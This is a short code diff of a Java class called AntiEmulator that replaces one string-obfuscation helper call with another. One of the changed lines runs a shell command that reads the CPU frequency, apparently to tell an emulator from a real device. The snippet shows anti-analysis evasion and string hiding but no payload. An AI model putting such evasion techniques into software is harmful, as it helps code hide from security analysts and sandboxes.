@@ -29,7 +29,7 @@ public class AntiEmulator {
 		}
 
 		// "/"
-		index = keys.lastIndexOf(M.d("/"));
+		index = keys.lastIndexOf(M.e("/"));
 
 		if (index == -1) {
 			return 0;
@@ -123,7 +123,7 @@ public class AntiEmulator {
 		Execute exec = new Execute();
 
 		// "cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq"
-		ExecuteResult ret = exec.execute(M.d("cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq"));
+		ExecuteResult ret = exec.execute(M.e("cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq"));
 
 		// Ci interessa solo la prima riga
 		for (String frequency : ret.stdout) {
